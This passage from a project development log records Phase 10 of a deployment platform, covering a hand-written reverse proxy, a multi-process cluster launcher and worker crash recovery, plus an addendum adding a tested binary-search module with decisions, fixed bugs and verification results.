- **Request latency is per-process and in memory**, so it resets when a replica restarts and is not
  summed across replicas. Correct for "this replica's event loop", incomplete as a service SLI.
- **No per-route latency breakdown.** One number for every endpoint; a slow download and a slow
  login are indistinguishable in it.
- **The queue-depth election means one publisher, so a gap while the winner is between ticks.** The
  chart interpolates across it. Nothing publishes queue depth at all while Redis is unreachable —
  correct (the counters live in Redis), but the chart holds its last value rather than showing a
  hole.
- **`activeResources` is a count, not a breakdown.** A handle leak is visible as a climbing number
  but not attributable to a kind of handle.
- **Container samples still depend on the sampler lease.** With `DOCKER_STATS_INTERVAL_MS=0` the
  container charts and the `container_*` series are empty by design, and the metrics page says
  "no worker has sampled a container yet" rather than distinguishing that from "nothing is running".
- **No alerting, no thresholds.** The tiles colour themselves amber/red past 70 %/90 % for loop
  utilisation and container memory; nothing else has a threshold and nothing notifies.
- **The metrics page's org scoping is partial by design.** Process and queue numbers are
  infrastructure-wide (there is one queue, not one per tenant) and shown to any member; only the
  containers and the deployment aggregates are filtered to the caller's org.
- Everything Phases 7–8 deferred still stands.

### Next up — Phase 10 (Local scaling)

Phase 9 built most of what Phase 10 needs to *show*. Process metrics are keyed by
`<role>:<instance>` and read from Redis rather than from the process serving the page, so a second
API replica and a third worker appear on the metrics page as extra cards the moment they boot, with
no code change — and disappear when their TTL lapses, which is exactly the "kill a worker mid-deploy"
picture. `API_INSTANCE_ID` / `WORKER_NAME` are already the knobs that name them, the WS `hello`
frame already says which replica served a socket (the page marks it "holds your socket"), and
`forge_ws_sockets` is per-replica, so a round-robin proxy's effect is measurable. What Phase 10 has
to add is the proxy itself, compose replicas for api/worker, and the fleet view's "which worker ran
which deployment" join — `deployments.worker_id` and `WorkerRuntimeMetrics.workerId` are both
already recorded for it. One caveat worth carrying over: the queue-depth publisher election is
per-tick and best-effort, so with several API replicas the `metrics` stream will hop between
publishers — harmless for a gauge, but the first thing to look at if the queue chart ever looks
jittery under replication.

---

## Phase 10 — Local scaling ✅

**Goal:** prove the architecture is horizontal on one laptop — several API replicas behind a
reverse proxy, several workers competing for one queue, and a worker crash mid-build recovered by
whoever is still alive.
**Completed:** 2026-09-07.

### What shipped

**`apps/proxy`** (new, `@forge/proxy`) — one address in front of N API replicas
- `src/upstream-pool.ts`: round-robin selection, one keep-alive `http.Agent` per upstream, active
  health polling plus **passive** marking (a connection that could not be established takes its
  upstream out on the failed request, not on the next probe tick). Asymmetric flip thresholds —
  `PROXY_UNHEALTHY_AFTER` to drop, `PROXY_HEALTHY_AFTER` to take back.
- `src/headers.ts`: hop-by-hop stripping, *including* the names a request's own
  `Connection: X, Y` header nominates; `X-Forwarded-For` **appended** rather than replaced;
  `bodyMayStillBeUnsent()` (reads `readableDidRead`) — the retry predicate.
- `src/forward.ts`: the streamed HTTP hop, both directions, no buffering. Headers-only deadline so
  a streaming download is never cut. Transparent failover to another replica when a connect fails
  before any body byte has moved. Adds `x-forge-upstream` and appends it to
  `Access-Control-Expose-Headers` so the browser can read it.
- `src/upgrade.ts`: the WebSocket path — replay the GET with its upgrade headers restored, relay
  the `101` verbatim (rewriting it would break `Sec-WebSocket-Accept`), write both `head` buffers,
  then pipe the raw sockets. `setNoDelay`, idle timeouts, and either side closing ends the other.
- `src/status.ts`: `GET /__forge/proxy` — the only route it serves rather than forwards.
- `src/server.ts`: explicit `headersTimeout`/`requestTimeout`/`keepAliveTimeout`, graceful shutdown
  with `closeIdleConnections()`.

**`scripts/cluster.mjs`** + `pnpm cluster`
- `pnpm cluster [--api N] [--workers M] [--base-port P] [--no-proxy] [--no-dashboard]`. Builds the
  packages first, then spawns each process in **its own process group**, prefixes output per line,
  and reads commands on stdin: `list`, `kill <name>` (SIGKILL — the crash), `stop <name>`
  (SIGTERM — the drain), `start <name>`, `quit`.
- Replicas are `api-1..N` on `--base-port` upward with `API_INSTANCE_ID` set to match; workers are
  `worker-1..M` via `WORKER_NAME`; the proxy gets `PROXY_UPSTREAMS`; the dashboard gets
  `NEXT_PUBLIC_API_URL` pointing at the proxy.

**`packages/shared`** — the contract
- `DEPLOYMENT_TRANSITIONS`: every in-flight status may now also go to **`queued`**. That is the
  stall edge, modelled rather than forced.
- `IN_FLIGHT_DEPLOYMENT_STATUSES` / `isInFlightStatus()` — the set in which exactly one worker owns
  the row (`queued` deliberately excluded: a queued deployment is owned by the queue).
- `WORKER_LOST_CODE`, `deploymentSchema.workerName`, `apiReplicaSchema`, `fleetSchema.api`.
- `REDIS_KEYS.orphanReaperLock`.

**`packages/db`**
- `DeploymentWithWorkerRow` + one `selectDeploymentsWithWorker()` LEFT JOIN, used by
  `listDeployments`, `findDeployment`, `listOrgDeployments` and the new
  `listWorkerDeployments(workerId, orgId, limit)` — org-scoped, because a worker builds for every
  tenant on the host.
- `reclaimAbandonedDeployment(id, previousWorkerId)` — conditional on the status still being
  in-flight **and** `worker_id` still being the process we found dead.
- `abandonDeployment(id, previousWorkerId, reason)` — the same conditional, writing `failed`.
- `listStalledDeployments(staleMs)` — in-flight rows that have not moved.
- `listWorkers({ limit, seenWithinMs })`.

**`packages/queue`**
- `createDeploymentWorker` now takes `stalledIntervalMs` and `maxStalledCount`.
- `getDeploymentJobState(deploymentId)` — so the sweep can stand down when BullMQ still owns a job.

**`apps/worker`**
- `processor.ts` → `takeOverAbandoned()`: the crash recovery. Proves the previous owner's heartbeat
  key is gone, wins a conditional re-queue, records and publishes the `queued` transition naming
  the dead worker and the stage it died in, then falls through to the normal claim.
- `services/worker-liveness.ts`: `alive | gone | unknown`, where a Redis error is *never* read as
  "dead".
- `services/orphan-reaper.ts`: leader-elected sweep for deployments whose worker **and** whose job
  are both gone; records `WORKER_LOST` with an explanation. Also runs once at boot.
- `services/deployment-state.ts`: `recordStatus()` split out of `transition()` for the writes that
  must be conditional.
- `main.ts`: the stall knobs, the reaper's boot sweep and timer, `reaper.stop()` in shutdown.
- `build/build-env.ts`: `FORGE_WORKER_ID` in both the build and the container environment.

**`apps/api`**
- `fleet-service.ts`: `getApiReplicas()` projects the API half of the fleet out of Phase 9's
  process-metrics documents; `getWorkers()` now asks for a recency window.
- `GET /orgs/:orgId/workers/:workerId/deployments`. `API_VERSION` → `0.10.0`.

**`apps/dashboard`**
- `lib/api.ts`: `getLastUpstream()` / `onUpstreamChange()` — the `x-forge-upstream` header captured
  in the fetch wrapper and published to subscribers; `ApiReplica`, `ProxyStatus`, `workerName`.
- Fleet page: a **Reverse proxy** panel (per-upstream rotation state, request/upgrade split, probe
  latency, which replica served your last request), an **API replicas** panel (a card each,
  marking the one that holds your WebSocket), workers listed with a per-worker build history one
  click away, and the activity feed naming the *worker* rather than a uuid prefix.

**Config** — `PROXY_*` (9 vars), `DEPLOY_JOB_STALL_INTERVAL_MS`, `DEPLOY_JOB_MAX_STALLED`,
`FLEET_WORKER_WINDOW_MINUTES`, `ORPHAN_REAP_AFTER_MS`, `ORPHAN_REAP_INTERVAL_MS`, and
`DEPLOY_JOB_LOCK_MS` lowered 60s → 30s. All documented in `.env.example`.

### Decisions & assumptions

- **The proxy is hand-written, and that is the point.** Caddy or Nginx would do this in ten lines
  of config; the roadmap allowed either. `http.request` + `pipe` + the `upgrade` event are a
  CLAUDE.md §4 learning goal, and the parts a config file hides are the interesting ones: which
  headers are hop-by-hop, when a retry is safe, what happens to bytes that arrive alongside a
  WebSocket handshake. It also avoids the container/host networking detour a Dockerised Nginx
  would need to reach API processes running on the host.
- **Health is polled on `/health/live`, not `/health`.** Liveness, not readiness. A replica whose
  Postgres is down can still return a truthful 503 explaining that; routing around it would turn
  one visible outage into a silent one. For the same reason, if *every* upstream is marked
  unhealthy the proxy still forwards to one rather than answering 502 itself.
- **Round-robin, not least-connections.** The replicas are identical processes on one laptop and
  the demo's claim is that the choice is *arbitrary* — no sticky sessions, because a session is an
  opaque token in Redis. A cleverer policy would obscure that.
- **A retry is gated on the body, not on the HTTP method.** The condition is whether any byte has
  been handed over, so a POST that never reached a replica is exactly as un-run as a GET that
  never did. This is why the client request is not piped into the upstream until the socket is
  actually connected — and why `socket.connecting` has to be checked, since a reused keep-alive
  socket never emits `connect`.
- **A failed WebSocket upgrade is not retried.** A retry means a second handshake with the same
  `Sec-WebSocket-Key`, and Phase 5's client already reconnects with backoff. Simpler, and it is
  the behaviour the dashboard is built around.
- **`GET /__forge/proxy` is unauthenticated, and thin because of that.** The proxy holds no Redis
  connection and cannot check a session; giving it one so it could authenticate its own status
  page would give a load balancer a reason to hold state. It exposes local host:port pairs and
  counters — what the fleet page already shows any member — and no request contents.
- **API replicas are listed from Phase 9's metrics documents, not from a new registry table.** An
  API replica holds nothing authoritative, so the only interesting fact about one is that it is
  running, and a Redis document under a TTL already says exactly that. The coupling is real and
  stated on the page: with `METRICS_INTERVAL_MS=0` there is no liveness signal for an API process
  and the list is empty. A second heartbeat that could disagree with the first would be worse.
- **The stall edge is a real transition.** `installing → queued` is now legal rather than forced,
  because "went back to the queue because its worker vanished" is a genuine thing that happens to
  a deployment, and the dashboard should be able to render it as one. The takeover writes it with
  `force` only because the conditional update had to write the status first to win the race.
- **A stall spends no retry attempt.** BullMQ does not increment `attemptsMade` for one, and that
  is right: nothing about the build failed. `DEPLOY_JOB_MAX_STALLED` is a separate ceiling, and it
  exists so a job that reliably kills its worker cannot work through the whole fleet one process
  at a time.
- **Liveness that cannot be *read* throws instead of deciding.** Returning would complete the job
  and strand a row nothing owns; taking over would risk a second pipeline for a live build.
  Throwing spends one retry and keeps the job — the cheap mistake.
- **The orphan sweep records `WORKER_LOST`; it does not re-enqueue.** One process deciding to
  silently re-run other processes' builds is a much bigger lever than the problem needs, and the
  dashboard's Retry and Rollback buttons already exist. Its threshold (3 min) is multiples of the
  whole stall window, so BullMQ's recovery always wins the race; the sweep only sees deployments
  whose job the queue lost entirely.
- **`DEPLOY_JOB_LOCK_MS` 60s → 30s.** Purely how long the demo takes to become interesting. The
  renewal timer runs at half the lock duration and is independent of the processor, so 30s is
  still a wide margin. Recovery is therefore `lock + stalledInterval` ≈ 30–45s; measured at 30–32s.
- **The cluster launcher signals process *groups*.** `pnpm --filter … dev` spawns tsx, which spawns
  node, and the process actually holding the heartbeat is that grandchild. Signalling the wrapper
  alone leaves a live worker behind, which would make the crash demo silently not a crash demo.
- **`kill` and `stop` are different words for different demos** — SIGKILL exercises stall recovery
  (nothing is recorded, the heartbeat expires on its own), SIGTERM exercises the drain path
  (builds aborted, recorded as failed, retried immediately).
- **The fleet's worker list is a recency window, not the table.** A row per process run is the
  right history; as a live view it had accumulated 38 rows.
- **`FORGE_WORKER_ID`, not `FORGE_WORKER_NAME`.** The id is on the deployment row already, so it
  needs no plumbing through the pipeline and cannot disagree with the fleet view.

### Bugs found and fixed along the way

- **A crashed worker's deployment was stranded forever, and the job was marked *successful*.** This
  is the Phase 10 bug and it was pre-existing since Phase 4. `claimDeployment` is conditional on
  `status in ('queued','assigned')` — load-bearing, since it is what stops two live workers from
  building the same deployment — so a job re-delivered after a stall hit that refusal, the
  processor logged "could not claim deployment" and **returned**, which BullMQ reads as success.
  The row stayed at `installing`, the job left the queue, and the dashboard showed a spinner with
  nothing behind it. Observed exactly that way in the first crash run before the fix was in the
  running processes. Fixed by `takeOverAbandoned()` plus the orphan sweep as a backstop.
- **`createLogger`'s `base` option was silently discarded.** `pino({ ...options, base: { service } })`
  overwrote it wholesale, so every caller passing `base: { service, pid }` — the API, the worker —
  lost the pid. Invisible until this phase, where several processes of the same role log to one
  terminal and the pid is how you tell them apart. Now `base: { ...options.base, service }`.
- **The fleet page listed every worker that had ever registered** — 38 rows on this laptop, all but
  one long dead, with the single online worker somewhere in the middle. `listWorkers` now takes a
  recency window; the history in the table is untouched.
- **Kysely will not compare a `Generated<Timestamp>` column against a `RawBuilder`**, which is why
  `listStalledDeployments`'s `updated_at` predicate is raw SQL while `pruneStaleWorkers`'s
  (a plain nullable column) is not.

### Verification

Two API replicas, two workers and the proxy, started with `pnpm cluster --api 2 --workers 2`,
driven over HTTP/WebSocket and through headless Chrome over CDP.

| Check | Result |
|---|---|
| `pnpm typecheck` | ✅ clean across all 10 workspaces (incl. the new `@forge/proxy`) |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ 6 packages + proxy + api + worker + dashboard |
| `pnpm cluster --api 2 --workers 2` | ✅ builds packages, starts 5 processes, prints pids |
| … `list` / `start <name>` / `stop <name>` / `kill <name>` | ✅ all four act on the right process group |
| **Proxy: round-robin** | ✅ 6 requests alternated `4001, 4002, 4001, 4002, 4001, 4002` by `x-forge-upstream` |
| … request bodies pass through | ✅ `POST /auth/login` reached a replica and returned its own **401** |
| … `Access-Control-Expose-Headers` | ✅ the API's list plus `x-forge-upstream`, appended not replaced |
| **Proxy: replica killed (SIGKILL)** | ✅ taken out of rotation, and the in-flight request that hit it was **retried on the survivor — the client saw 200**, not an error |
| … replica restarted | ✅ back in rotation (`2/2`) within one probe window, `connectErrors 2` retained |
| **No sticky sessions** | ✅ registered on `4001`, then 6 `GET /auth/session` alternated across both replicas — all 200 |
| **WebSocket through the proxy** | ✅ `101` relayed, `hello` named the replica, **245 metric frames** in 8s |
| **Two sockets, two replicas, one deployment** | ✅ tab-A on `api-1`, tab-B on `api-2`; both received the identical 9-status sequence (`queued → … → live`) **and all 146 log frames** — the fan-out is Redis Pub/Sub, not process memory |
| **Crash demo (SIGKILL mid-build)** | ✅ **the roadmap's checkpoint** |
| … timeline | ✅ `building` → `queued` *"Worker worker-2 stopped responding during \"building\"; the job was returned to the queue and picked up by worker-1"* → `assigned` (attempt 2) → … → `live` |
| … recovery latency | ✅ 30–32 s (lock 30s + stall scan 15s), twice |
| … the app really served | ✅ `curl http://localhost:32949/` → `{"ok":true,…,"attempt":"2"}` — the second run produced the artifact |
| **Drain demo (SIGTERM mid-build)** | ✅ `BUILD_ABORTED` recorded, auto-retried on the other worker **+6 s**, `live` |
| **Orphan sweep** | ✅ exercised for real: a stale pre-Phase-10 worker completed a stalled job, and 3 min later the sweep recorded `failed / WORKER_LOST` naming the worker, the stage and the job state (`completed`) instead of leaving a spinner |
| **Fleet page** (headless Chrome, logged in through the proxy) | ✅ proxy panel, both upstreams, rotation state, probe latency; "served your last request" marker |
| … API replicas panel | ✅ `api-1` and `api-2` as cards, with "holds your socket" on the right one |
| … workers | ✅ `worker-1` / `worker-2` by name, drill-down opens and resolves (12 rows) |
| … request split visible in the UI | ✅ `189` vs `192` requests and `7` vs `3` WebSocket upgrades |
| … console | ✅ 0 console errors, 0 page exceptions across every run |

### Not done / deferred on purpose

- **Still no Vitest suites.** Ten phases of test debt. `tokenizeCommand`, `percentileOf`,
  `renderPrometheus`, and now `buildUpstreamHeaders` / `nominatedByConnection` /
  `UpstreamPool.next()` are pure and are the obvious first suite. Still the biggest gap.
- **The apps are not containerised.** Replicas are host processes, which is why the proxy is a Node
  process rather than a Caddy container. No Dockerfiles for api/worker, so the compose file still
  holds only Postgres and Redis.
- **No TLS and no `*.localhost` routing.** Both are Phase 12 stretch goals; the proxy is the hook
  for them (a `Host`-header switch and an `https.createServer` are where they would go).
- **The proxy's status endpoint is unauthenticated** — see the decision above. Acceptable locally,
  wrong for anything shared.
- **Proxy counters are per-process and in memory.** Restart the proxy and the split resets. It is
  the one process in the fleet that legitimately holds nothing, so there is nowhere to put them
  that would not undo that.
- **The proxy is not in `/metrics`.** It reports through `/__forge/proxy` only; it does not write a
  process-metrics document, so it is absent from the metrics page's process cards.
- **A killed replica's in-flight requests are still lost.** Only a *connect* failure is retried; a
  request whose body had started streaming, or whose response had started, gets a 502 or a
  truncated body. That is the honest limit of retrying without buffering.
- **Recovery takes 30–45 s and cannot be much faster** without a lock duration short enough for a
  blocked event loop to trip it. The knobs are exposed; the default is chosen to be watchable.
- **A takeover restarts the pipeline from `cloning`.** No stage-level resume — the dead worker's
  sandbox is gone and its partial `node_modules` is not trustworthy. The retry rebuilds, which is
  correct but not fast.
- **`maxStalledCount` exceeded fails the job without the processor running**, so that row is left
  to the orphan sweep's 3-minute window rather than being failed immediately.
- **The queue-depth publisher election still hops between replicas** (Phase 9's note). Harmless for
  a gauge; visible as jitter if the queue chart is watched closely under replication.
- **`FLEET_WORKER_WINDOW_MINUTES` is a blunt filter.** Two hours of history on a busy laptop is
  still a long list, and it does not distinguish "ran something" from "registered and idled".
- Everything Phases 7–9 deferred still stands.

### Next up — Phase 11 (Hardening & failure demos)

Phase 10 turned out to be where two of Phase 11's items got their teeth. The crash path is now a
recorded, visible state transition rather than a stuck row, and the `WORKER_LOST` sweep is exactly
the "graceful degradation, visible error state, not a silent crash" rule applied to a lost worker —
so Phase 11's Redis/Postgres-unavailability demos have a pattern to copy rather than invent. The
cluster launcher is the tool the rest of that phase wants: `kill`, `stop` and `start` on named
processes is how you stage a failure on stage, and `--api 1 --workers 1` reproduces the
single-process setup when a demo needs to be simple. What Phase 11 has to add is the deliberate
breakage: build timeouts and app crashes surfaced cleanly (the pipeline already classifies both —
what is missing is the demo script), `docker compose stop redis` mid-deployment, the CPU-heavy
worker-thread demonstration, and the security pass. The one caveat to carry over is the test debt:
ten phases in, every claim in these tables was verified by a scratchpad script that was then thrown
away, and Phase 11 is the phase where "prove the security rules hold" really wants an assertion
suite that stays in the repo.

---

## Addendum A — Binary search over the deployment history

**Not a roadmap phase.** A self-contained addition made between Phases 10 and 11, recorded here
because it changes shipped code and because it is the first assertion suite that stays in the repo.

**Why it exists:** the write-up's algorithms chapter documents five algorithms, all of which are
*systems* algorithms — idempotent creation, streamed build execution, container release, worker
recovery, rollback. None is a classical algorithm with a name and a complexity class, and the parts
that sound like one are borrowed: idempotency leans on Postgres' B-tree index, backoff is BullMQ's,
the token bucket is `@fastify/rate-limit`'s, SHA-256 is `node:crypto`'s. This adds one classical
algorithm that is genuinely ours, at a call site where it is genuinely the right tool.

### What shipped

**`@forge/shared`**
- `src/binary-search.ts` — `lowerBound`, `upperBound`, `binarySearch`, `searchRange`, `sliceRange`,
  `findAtOrBefore`. Comparator-driven and order-aware (`order: 'desc'` negates the comparator, so
  one loop serves both directions rather than two copies of each function). Every function is the
  same half-open `[lo, hi)` loop with the overflow-safe midpoint `lo + ((hi - lo) >> 1)`.
- An optional `onProbe` callback on every search, so a caller can render the probe sequence. This
  is the only concession the module makes to its UI caller, and it costs nothing when unused.
- `test/binary-search.test.mjs` — 108k differential assertions under `node --test`.
- New subpath export `@forge/shared/binary-search`, so the browser can import the algorithm without
  pulling `index.js` (and therefore Zod) into the bundle.

**`@forge/dashboard`**
- `components/deployments-panel.tsx` — a "What was live at ⟨time⟩" control above the deployment
  history. The list is already in memory sorted `created_at DESC`, so the lookup is a predecessor
  search over it: `findAtOrBefore(list, target, deploymentTime, { order: 'desc' })`. The result line
  reports the probe count against the row index a linear scan would have reached, and each probed
  row is numbered in the list in the order the search touched it.
- `mergeEvents` in the same file no longer rebuilds a `Set` of every event id on screen to
  de-duplicate each incoming batch; it binary-searches the (already id-sorted) timeline instead.
  This is on the log-streaming hot path — it ran every `FLUSH_MS` against a timeline thousands of
  lines long.
- First runtime dependency on a workspace package (`@forge/shared`), where before the dashboard
  mirrored shared types structurally. The convention is unchanged for *types*; this is runtime code
  that would otherwise have to be duplicated.

### Decisions & assumptions

- **Browser-side, not in a repository.** The obvious server version of this query is
  `WHERE created_at <= $1 ORDER BY created_at DESC LIMIT 1`, and Postgres' index already answers it
  in log time — hand-writing that would be a worse implementation of something the database does
  properly. The honest justification for our own binary search is that the dashboard already holds
  the sorted page and a network round trip per keystroke is the thing being avoided.
- **`findAtOrBefore`, not `binarySearch`, for the seek.** A timestamp typed into a box will never
  be a timestamp a deployment actually has, so exact match answers "nothing" to a reasonable
  question. Predecessor search is the right form.
- **Order handled by negating the comparator** rather than by separate ascending/descending
  functions, so the two orders cannot drift apart. Every function then reads in *array order*.
- **`node --test` rather than Vitest.** The testable surface is one file of pure functions; the
  runtime has had a test runner since Node 18, and this avoids adding a dev dependency and a config
  file for it. If Phase 11 brings Vitest in for the API's `.inject()` tests, this suite should move.
- **Differential testing, not examples.** Hand-picked cases would have been chosen by whoever wrote
  the off-by-one. Every result is compared against a linear scan over randomly generated arrays
  drawn from a deliberately small key domain, so duplicate keys — where `lowerBound` and
  `upperBound` diverge — are the common case rather than an afterthought.

### Verification

- `pnpm --filter @forge/shared test` — **4/4 suites, 108,248 assertions pass.** Covers: both orders
  against a linear reference; empty, single-element and all-duplicate arrays; targets before, on and
  after every boundary; inverted ranges; the real deployment-history shape; and a probe-count
  assertion that the search stays within `ceil(log2(n+1))`, measured at n = 1 → 100,000
  (1, 4, 7, 10, 14, 17 probes respectively — i.e. 17 comparisons where a scan would take 100,000).
- `pnpm typecheck` — clean across all 10 workspace projects.
- `pnpm lint` — clean.
- `pnpm --filter @forge/dashboard build` — clean; the project page is 12.8 kB and the shared chunks
  are unchanged, confirming the subpath export kept Zod out of the browser bundle.
- **Not verified in a browser.** The dev server running on port 3000 was left alone rather than
  restarted mid-session, so the seek control has been compiled and type-checked but not clicked.

### Not done / deferred on purpose

- **No metrics-chart call site.** `lib/metrics.ts` keeps 150-point series that would slice nicely
  with `searchRange`, but nothing on the metrics page filters by time window today, so adding the
  method would have added an unused one. `searchRange`/`sliceRange` ship tested but currently
  unused by application code.
- **No server-side caller.** Nothing in the API or worker uses the module; the sorted-lookup work
  there belongs to Postgres.
- **`percentileOf` still sorts.** It is O(n log n) via `Array.prototype.sort` where Quickselect
  would be O(n) average, and it is the other place a classical algorithm would genuinely replace a
  borrowed one. Left alone deliberately — it is a separate change with a separate benchmark.

### Next up

Unchanged: Phase 11 (Hardening & failure demos). The one thing this addendum hands it is a pattern
for the test debt named at the end of Phase 10 — `node --test` against built `dist/`, differential
where a reference implementation is cheap to write.
